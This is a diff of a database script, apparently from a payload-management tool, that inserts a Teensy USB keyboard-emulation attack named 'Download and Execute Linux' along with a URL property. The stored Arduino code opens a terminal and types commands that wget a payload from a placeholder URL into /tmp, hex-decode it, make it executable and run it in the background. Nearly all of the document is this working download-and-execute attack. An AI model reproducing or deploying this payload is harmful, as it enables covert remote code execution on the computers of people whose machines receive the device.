@@ -1,3 +1,5 @@
-/*C2*/SET SCHEMA PUBLIC
-CREATE TABLE DELETEME1373305894411\u000a(\u000a    UNUSED INTEGER NOT NULL\u000a)
-DROP TABLE DELETEME1373305894411
+/*C3*/SET SCHEMA PUBLIC
+INSERT INTO EXPLOIT VALUES(3,'Kautilia','void setup()\u000d{\u000d  delay(5000);\u000d  terminal();\u000d  delay(3000);\u000d  Keyboard.println("wget -O /tmp/pay <!--url-->");\u000d  delay(2000);\u000d  Keyboard.println("xxd -r -p /tmp/pay /tmp/payload");\u000d  delay(2000);\u000d  Keyboard.println("chmod +x /tmp/payload");\u000d  Keyboard.println("/tmp/payload &");\u000d  delay(2000);\u000d  Keyboard.println("exit");\u000d  \u000d}\u000d\u000dvoid loop()\u000d{\u000d   \u000d}\u000d\u000dvoid terminal()\u000d{\u000d  Keyboard.set_modifier(MODIFIERKEY_CTRL);\u000d  Keyboard.send_now();\u000d  Keyboard.set_modifier(MODIFIERKEY_CTRL | MODIFIERKEY_ALT);\u000d  Keyboard.send_now();\u000d  Keyboard.set_key1(KEY_T);\u000d  Keyboard.send_now();\u000d  \u000d  delay(100);\u000d  Keyboard.set_modifier(0);\u000d  Keyboard.set_key1(0);\u000d  Keyboard.send_now(); \u000d\u000d}\u000d','2013-07-15 00:00:00.000000','Download and Execute Linux','Teensy')
+COMMIT
+INSERT INTO PROPERTIES VALUES(2,'url','<!--url-->','http://',3,3)
+COMMIT
